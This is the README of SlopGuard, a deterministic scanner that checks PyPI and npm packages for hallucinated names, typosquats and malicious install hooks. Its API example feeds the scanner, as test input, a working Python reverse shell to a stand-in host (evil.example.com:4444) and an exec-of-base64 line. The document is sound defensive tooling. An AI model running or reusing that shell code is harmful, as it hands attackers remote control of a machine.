# 🛡️ SlopGuard: Zero-LLM AI Hallucination & Supply Chain Threat Auditor

[![SlopGuard CI](https://github.com/royans/slopguard/actions/workflows/ci.yml/badge.svg)](https://github.com/royans/slopguard/actions/workflows/ci.yml)
[![Python Version](https://img.shields.io/badge/python-3.11%20%7C%203.12-blue.svg)](https://github.com/royans/slopguard/)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Engine](https://img.shields.io/badge/Core-Zero--LLM%20Deterministic-green.svg)](#architecture)

**SlopGuard** is a fast, deterministic supply chain security scanner for Python (PyPI) and JavaScript (npm) packages and lockfiles.

> **Zero-LLM · 200ms Scans · Zero API Keys · Runs Offline**

Designed for developers, CI/CD pipelines, and autonomous coding agents, SlopGuard protects against **AI package hallucinations** (when an LLM invents a plausible package name that an attacker registers) and **install-time execution traps** (`setup.py` hooks, `.pth` startup implants, npm lifecycle scripts) *before* dependencies touch your machine.

> **Live Audits**: SlopGuard was developed for the [FlagThis](https://flagthis.com) website. A working live demonstration that performs live supply chain audits and threat intelligence indexing is available at [FlagThis.com](https://flagthis.com).

```bash
# ⚡ Try it in 10 seconds (no config, no API keys)
pip install slopguard
slopguard check requirements.txt   # catch hallucinated or unregistered packages
slopguard audit .                  # inspect local manifests and source files
```

---

## ⚡ Highlights & Key Capabilities

* **Zero-LLM Core Engine**: Fully deterministic execution via Python AST inspection, YARA signature scanning, and combinatorial heuristics. Zero probabilistic variance, zero external API costs, and sub-millisecond execution.
* **Deep Static AST Inspection**: Statically deconstructs Python `setup.py`, `pyproject.toml`, and module source code without dynamic code execution—detecting hidden reverse shells, raw sockets, eval-obfuscation, and child process execution.
* **npm Lifecycle Script Analysis**: Analyzes `package.json` hooks (`preinstall`, `install`, `postinstall`) and unpacks JS payloads for suspicious network exfiltration.
* **Pre-Compiled YARA Threat Engine**: Built-in YARA rules spanning 9 weaponization vectors: credentials, exfiltration, evasion, persistence, supply-chain hooks, and dropper logic.
* **Phantom Squatting & Typosquat Detection**: Identifies impersonations of high-value brands (Google, AWS, Stripe, Okta, Clerk, Supabase) using Levenshtein distance, token insertion, and delimiter swap heuristics.
* **AI Hallucination & Package Parking Auditor**: Scans project lockfiles and manifests (`requirements.txt`, `package.json`) to detect hallucinated package names frequently recommended by LLMs that do not exist or are parked by adversaries.
* **Version Confusion Anomaly Detection**: Surfaces suspicious version jumps (e.g. initial registrations claiming v99.0.0 or v50.0.0) while safely handling legitimate CalVer and date-stamped releases.

---

## 🚀 Installation & Quickstart

Install directly via pip:

```bash
pip install slopguard
```

### System Prerequisites

SlopGuard uses `yara-python` for high-throughput compiled pattern matching. Most standard environments install pre-built wheels automatically. If installing in an environment requiring source compilation:

* **macOS**:
  ```bash
  brew install yara
  ```
* **Debian / Ubuntu**:
  ```bash
  sudo apt-get update && sudo apt-get install -y python3-dev gcc libssl-dev
  ```

### Development Installation

To contribute or run from source:

```bash
git clone https://github.com/royans/slopguard.git
cd slopguard

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .
```

---

## 💻 CLI Quickstart

The `slopguard` command-line interface provides fast, rich terminal feedback for auditing and inspecting packages.

### 1. Check Project Manifests for Hallucinations
Scan your `requirements.txt` or `package.json` to verify that all declared dependencies are genuine and not unverified or parked squats:

```bash
slopguard check requirements.txt
slopguard check package.json
```

### 2. Deep Static AST Inspection of an Upstream Package
Fetch and statically inspect any published PyPI or npm package without executing its code:

```bash
slopguard inspect requests --ecosystem pypi
slopguard inspect express --ecosystem npm
```

### 3. Statically Scan Local Code or Directory
Run the AST analyzer and YARA rule engine across any local Python or JavaScript file/directory:

```bash
slopguard scan ./src
slopguard scan setup.py
```

### 4. Comprehensive Directory Audit
Audit an entire project directory, checking source files and manifests simultaneously:

```bash
slopguard audit .
```

### 5. Engine Diagnostics & Rule Status
View engine statistics, active YARA rule suites, and loaded parking signatures:

```bash
slopguard info
```

---

## 🐍 Python API Usage

SlopGuard can also be integrated directly into your own security tools and CI/CD pipelines:

```python
from slopguard import YaraPatternScanner, PythonASTAssessor

# 1. Scan source code with the YARA threat engine
scanner = YaraPatternScanner()
matches = scanner.scan_text('''
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.example.com', 4444))
os.dup2(s.fileno(), 0)
subprocess.call(['/bin/sh', '-i'])
''')

for match in matches:
    print(f"Detected: {match['rule']}")

# 2. Deep static AST analysis
assessor = PythonASTAssessor()
result = assessor.analyze_source("import base64; exec(base64.b64decode('...'))")
print(f"Threat Score: {result.composite_threat_score}/100")
print(f"Verdict: {result.verdict}")
```

---

## 🏗️ Architecture

```
┌───────────────────────────────────────────────────────────┐
│                    Target Input                           │
│     (Upstream Package Tarball, Manifest, or Local Source)  │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────┐
│              Deterministic Analysis Pipeline              │
│                                                           │
│  [1] Manifest & Metadata Sizing                           │
│      - Non-comment LOC & Codebase Tiering                 │
│      - Publisher Domain Proof vs Free Webmail Domain      │
│                                                           │
│  [2] Static AST Deconstruction (Zero Dynamic Execution)   │
│      - Python AST: setup.py / pyproject.toml hooks        │
│      - npm: package.json install hooks & lifecycle scripts│
│                                                           │
│  [3] Pre-Compiled YARA Engine                             │
│      - 9 Suites: Exfiltration, Shells, Persistence, etc.  │
│                                                           │
│  [4] Scoring & Classification Matrix                      │
│      - Normalized 0-1000 Threat Score                     │
│      - Verdicts: MALICIOUS | SUSPICIOUS | BENIGN          │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────┐
│             Output: Structured JSON / Terminal CLI        │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
     (Live community audits indexed at https://flagthis.com)
```

---

## 🔒 What SlopGuard Is & What It Isn’t

We believe security tools should be radically honest about their boundaries rather than overcommitting on claims.

### ✅ What SlopGuard IS:
* **A fast, deterministic first line of defense**: Runs in milliseconds via Python AST, compiled YARA signatures, and Levenshtein distance trees.
* **A detector for lazy automated weaponization**: Catches install-time socket connects, reverse shells, child process spawns in `setup.py`, malicious `.pth` startup files, Discord webhook exfiltration, and npm `preinstall` stealer payloads.
* **An auditor for AI package hallucinations**: Checks whether packages suggested by Copilot, Cursor, or ChatGPT actually exist on PyPI/npm or are parked slopsquats waiting for a developer to run `pip install`.
* **Respectful of maintainers**: Community libraries with ordinary telemetry or standard system calls are evaluated as `BENIGN_COMMUNITY` or `UNVERIFIED_COMMUNITY`. The `MALICIOUS` verdict is strictly reserved for confirmed, active weaponization vectors.

### ❌ What SlopGuard IS NOT:
* **Not an omniscient hypervisor sandbox**: It performs zero dynamic code execution. It will not execute code in a VM or kernel sandbox to observe runtime behavior.
* **Not a binary decompiler**: If an attacker embeds compiled machine code inside a native `.so`, `.dylib`, or `.node` file, SlopGuard flags the presence of unexpected native binaries (`BUNDLED_NATIVE_BINARY`), but it does not reverse-engineer the compiled C/Rust assembly.
* **Not a silver bullet**: Static analysis is inherently an adversarial cat-and-mouse game. High-entropy custom runtime encoders or multi-stage split downloaders can be designed to evade static regex. SlopGuard catches the bulk of automated supply chain attacks instantly without the latency, cost, or prompt-injection vulnerabilities of LLMs.

---

## 🤝 Contributing

Contributions are welcome! Please run our pre-submit gatekeeper before opening a pull request:

```bash
# Install git hooks
./scripts/install_hooks.sh

# Run pre-submit checks manually
python3 scripts/presubmit.py

# Run test suite
pytest tests/ -v
```

---

## 📄 License

Licensed under the [Apache License, Version 2.0](LICENSE).
